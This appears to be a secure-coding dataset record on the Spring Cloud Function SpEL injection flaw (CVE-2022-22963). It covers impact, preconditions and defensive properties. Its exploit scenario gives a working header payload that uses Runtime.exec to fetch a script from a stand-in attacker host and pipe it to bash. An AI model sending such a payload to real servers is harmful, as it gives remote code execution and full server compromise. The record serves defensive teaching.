context.real_world_incident: Spring Cloud Function versions 3.1.6 and 3.2.2 had a critical vulnerability allowing attackers to provide specially crafted SpEL (Spring Expression Language) expressions in routing parameters. Applications using the routing functionality inherited remote code execution (RCE) capability without explicit validation.
context.impact: Remote code execution with application privileges. Attackers can execute arbitrary code, read files, modify configurations, establish reverse shells, and completely compromise the application server.
context.affected_versions: Spring Cloud Function <= 3.1.6, Spring Cloud Function <= 3.2.2

references.title: Spring Cloud Function SpEL Injection RCE
Spring Cloud Function SpEL Injection Analysis

conversations.value: We're using Spring Cloud Function for serverless-style routing in our microservices platform. How do we safely handle dynamic routing expressions?
How do we safely evaluate expressions when we actually need dynamic behavior for legitimate use cases?

exploit_scenario.description: Attacker sends a crafted Spring Expression Language (SpEL) payload via the spring.cloud.function.routing-expression HTTP header. The SpEL expression evaluates on the server, enabling Remote Code Execution. Example payload: T(java.lang.Runtime).getRuntime().exec('curl attacker.com/shell.sh|bash'). CVE-2022-22963 affected Spring Cloud Function before 3.1.7 and 3.2.3.
preconditions: Application uses Spring Cloud Function with RoutingFunction enabled
Attacker can send HTTP requests with custom headers to the function endpoint

secure_properties: Spring Cloud Function upgraded to 3.1.7+ or 3.2.3+
SpEL evaluation is disabled or restricted to SimpleEvaluationContext
Routing expressions use static configuration, not HTTP header input
WAF rules block SpEL syntax patterns in HTTP headers
Runtime monitoring detects SpEL evaluation of untrusted input
negative_properties: Must not evaluate user-controlled SpEL expressions with StandardEvaluationContext
Must not accept routing expressions from HTTP headers in production
Must not use vulnerable Spring Cloud Function versions
Must not allow T() type references in SpEL expressions from external input
